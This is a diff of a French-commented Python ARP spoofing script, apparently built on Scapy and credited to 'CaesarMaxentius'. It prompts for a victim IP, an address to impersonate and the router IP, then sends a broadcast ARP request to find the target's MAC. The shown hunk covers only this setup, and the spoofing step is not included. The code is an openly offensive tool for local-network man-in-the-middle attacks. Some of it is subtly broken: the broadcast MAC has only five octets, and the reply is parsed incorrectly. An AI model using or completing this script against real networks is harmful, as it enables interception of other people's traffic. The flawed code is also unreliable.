@@ -50,35 +50,31 @@ def main():
 # Fonction principale permettant de faire fonctionner tout le programme
 def arpspoof():    
     # Message de bienvenue
-	print("***********************************************************************")  
-	print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
-	print("***********************************************************************")   
-    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses charactères
-	targetIP = input("Entrez l'adresse IP de la victime : ") # On défini la fonction targetIP qui sera l'IP de la victime
-	spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ") # On défini la fonction spoofIP qui sera l'IP que nous voudrons usurper.
-	routeurIP = input("Entrez l'adresse IP du routeur : ")
-	interface = input("Entrez votre interface ethernet : ")
-# -----------------
-	    # RECHERCHER LA MAC
-	def recherche_mac(targetIP, interface):
-	    pkt7 = Ether(dst="ff:ff:ff:ff:ff") / ARP(pdst=targetIP) 
-	    ans = srp1(pkt7, iface=interface, timeout=2)
-	    
-	    if ans:
-	        mac = ans[0][1].hwsrc
-	        return str(mac)
-	    else:
-	        print("L'adresse MAC est inexistante")
-	
-	recherche_mac()
-# -----------------
+    print("***********************************************************************")  
+    print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
+    print("***********************************************************************")   
+    
+    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses caractères
+    targetIP = input("Entrez l'adresse IP de la victime : ")
+    spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ")
+    routeurIP = input("Entrez l'adresse IP du routeur : ")
+    interface = input("Entrez votre interface ethernet : ")
 
-	destinationIP = targetIP # Cela reprend notre précédente fonction (IP de la victime)
-	sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ") # Pour s'assurer de revenir à l'état normal, nous renverrons des paquets ARP correctes.
+    destinationIP = targetIP
+    sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ")
 
-# -----------------
-    # A MODIFIER
-	sourceMAC = 'x'
+    # Fonction pour rechercher la MAC
+    def recherche_mac(targetIP, interface):
+        pkt7 = scapy.Ether(dst="ff:ff:ff:ff:ff") / scapy.ARP(pdst=targetIP) 
+        ans = scapy.srp1(pkt7, iface=interface, timeout=2)
+        if ans:
+            mac = ans[0][1].hwsrc
+            return str(mac)
+        else:
+            print("L'adresse MAC est inexistante")
+
+    # Utilisation de la fonction recherche_mac avec les arguments nécessaires
+    destinationMac = recherche_mac(targetIP, interface)
 # -----------------
 
 # Message de lancement
